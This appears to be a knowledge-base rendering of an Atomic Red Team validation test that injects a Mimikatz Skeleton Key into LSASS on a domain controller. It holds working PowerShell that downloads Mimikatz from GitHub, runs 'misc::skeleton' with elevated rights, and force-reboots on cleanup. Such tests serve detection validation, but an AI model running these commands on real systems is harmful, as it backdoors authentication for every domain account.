---
atomic_guid: "0ee8081f-e9a7-4a2e-a23f-68473023184f"
title: "Skeleton Key via Mimikatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1556.001"
attack_technique_name: "Modify Authentication Process: Domain Controller Authentication"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.001/T1556.001.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "0ee8081f-e9a7-4a2e-a23f-68473023184f"
  - "Skeleton Key via Mimikatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Injects a Skeleton Key into LSASS on a domain controller using Mimikatz. Once injected, any domain
user account can be authenticated using the password 'mimikatz' until the domain controller is rebooted.

This test must be run on an isolated domain controller and must not be performed on a production DC.
Cleanup forces a reboot of the domain controller to evict the skeleton key from LSASS memory.

## ATT&CK Mapping

- [[kb/attack/techniques/T1556-modify_authentication_process#^t1556001-domain-controller-authentication|T1556.001: Domain Controller Authentication]]

## Input Arguments

### directory_path

- description: Directory path for mimikatz
- type: path
- default: C:\ExternalPayloads\Mimikatz

### file_path

- description: File path where the zipped mimikatz file is downloaded to
- type: path
- default: C:\ExternalPayloads\Mimikatz\mimikatz.zip

### mimikatz_path

- description: Path to the mimikatz executable
- type: path
- default: C:\ExternalPayloads\Mimikatz\x64\mimikatz.exe

### mimikatz_url

- description: The URL for the mimikatz release zip
- type: url
- default: https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip

## Dependencies

Mimikatz must be present on the host machine at

### Prerequisite Check

```powershell
if (Test-Path "#{mimikatz_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "#{directory_path}" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -Uri "#{mimikatz_url}" -OutFile "#{file_path}"
Expand-Archive -LiteralPath "#{file_path}" -DestinationPath "#{directory_path}" -Force
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
& "#{mimikatz_path}" "privilege::debug" "misc::skeleton" "exit"
```

### Cleanup

```powershell
Remove-Item -Path "#{directory_path}" -Recurse -ErrorAction Ignore
Restart-Computer -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.001/T1556.001.yaml)
